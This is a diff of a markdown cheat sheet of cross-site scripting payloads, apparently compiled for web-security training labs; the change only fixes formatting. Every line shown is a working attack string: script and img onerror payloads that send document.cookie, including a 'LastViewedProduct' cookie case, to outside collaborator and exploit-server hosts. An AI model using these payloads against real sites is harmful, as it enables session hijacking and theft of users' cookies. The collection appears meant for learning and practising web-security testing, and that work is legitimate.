@@ -61,11 +61,11 @@ fetch(`https://collaborator.net/?x=`+document.cookie);
 document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
 </script>`
 
-###HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.
+### HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.
 
-`&'><img src=1 onerror=print()>``
+`&'><img src=1 onerror=print()>`
 `&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>`
-`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>``
+`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>`
 
 ### Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.
 
